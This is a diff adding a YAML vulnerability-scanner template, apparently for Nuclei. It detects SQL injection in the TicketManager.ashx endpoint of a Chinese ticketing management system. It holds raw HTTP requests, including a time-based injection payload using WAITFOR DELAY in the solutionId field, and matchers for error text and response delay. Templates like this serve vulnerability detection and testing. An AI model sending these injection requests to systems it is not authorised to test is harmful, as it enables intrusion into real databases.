@@ -1,0 +1,58 @@
+id: poc-yaml-zckx-ticketmanager-ashx-sqli
+info:
+  name: "中成科信票务管理系统 TicketManager.ashx SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template checks for SQL Injection vulnerabilities in TicketManager.ashx of 中成科信票务管理系统. Exploitation involves testing specific SQL payloads and analyzing the response for SQL error messages or time delays.
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /SystemManager/Api/TicketManager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Method=GetReServeOrder
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "命名空间"
+          - "超出范围"
+          - "SqlException"
+
+  - raw:
+      - |
+        POST /SystemManager/Api/TicketManager.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        Method=GetReServeOrder&solutionId=1' WAITFOR DELAY '0:0:{{t1}}'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"Table\":[]}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
